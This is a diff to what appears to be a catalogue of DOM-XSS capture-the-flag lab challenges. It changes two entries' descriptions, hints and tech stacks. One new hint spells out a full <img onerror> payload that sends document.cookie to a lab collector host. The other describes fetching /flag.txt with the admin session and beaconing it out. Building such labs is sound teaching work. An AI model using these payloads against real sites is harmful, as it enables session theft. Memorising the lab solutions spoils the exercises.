@@ -616,18 +616,19 @@
         "difficulty": "apprentice",
         "description": "A static single-page marketing site reads location.hash on load and calls document.write('<h1>Welcome ' + decodeURIComponent(location.hash.slice(1)) + '</h1>') to personalise the greeting. No sanitisation is performed and the sink runs before the DOM has finished parsing.",
         "objective": "Craft a URL whose #fragment causes the page, when opened by the admin bot, to fetch /flag.txt from the same origin and POST its body to http://collector:9000/report.",
-        "flag_hint": "/flag.txt is served from the app root but is only useful once the admin bot has fetched it and shipped the value to the OOB collector. /solve returns the completion flag when the collector has recorded the exact /flag.txt content.",
+        "flag_hint": "GET /flag.txt returns the flag only to a request carrying the admin session cookie; the DOM-XSS payload runs in the bot's origin so its same-origin fetch sends the cookie. Beacon the body to http://collector:9000/report?f=... and read it via GET /oob/received.",
         "skills_taught": [
           "identifying client-side DOM sinks",
           "URL-fragment payload delivery",
           "same-origin fetch after XSS"
         ],
         "tech_stack": [
-          "Static HTML",
-          "vanilla JS",
-          "nginx 1.27",
-          "Puppeteer 22 headless admin bot",
-          "Node 20 OOB collector on port 9000"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "vanilla JS (location.hash → document.write sink)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "textbook DOM XSS pattern described in the DOM-XSS wiki and OWASP DOM-XSS cheat sheet"
       },
@@ -657,20 +658,21 @@
         "slug": "dom-xss-innerhtml-jquery-html",
         "title": "DOM XSS via jQuery .html() on hashchange",
         "difficulty": "apprentice",
-        "description": "A tabbed dashboard uses jQuery 3.4.1. On every hashchange event it runs $('#panel').html(decodeURIComponent(location.hash.slice(1))). Modern innerHTML will not execute inline <script>, but event-handler attributes on freshly-parsed elements execute normally.",
-        "objective": "Deliver a hash payload that runs arbitrary JS in the admin bot's browser and exfiltrates document.cookie to the OOB collector.",
-        "flag_hint": "OOB collector logs incoming requests; /solve compares captured cookie against the app's live admin session and returns the flag on match.",
+        "description": "A tabbed dashboard uses jQuery to render the URL fragment on load and on every hashchange: $('#panel').html(decodeURIComponent(location.hash.slice(1))). innerHTML will not execute an inline <script>, but event-handler attributes on freshly-parsed elements (<img onerror>) execute normally. Uses current jQuery 3.7.1 — the taught flaw is the app's own .html(untrusted) misuse, identical across versions, so a non-CVE'd jQuery keeps the Trivy gate honest.",
+        "objective": "Deliver a hash payload that runs arbitrary JS in the admin bot's browser and exfiltrates document.cookie to the OOB collector, then POST /solve.",
+        "flag_hint": "Submit /#<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"> (URL-encoded) to POST /report; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
         "skills_taught": [
           "jQuery html() as a DOM sink",
           "why <img onerror> beats <script> for innerHTML",
           "hashchange as a payload trigger"
         ],
         "tech_stack": [
-          "Static HTML",
-          "jQuery 3.4.1",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "jQuery 3.7.1 (.html() sink)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "generic legacy jQuery dashboard XSS pattern documented in DOM-XSS Wiki and Snyk advisories"
       },
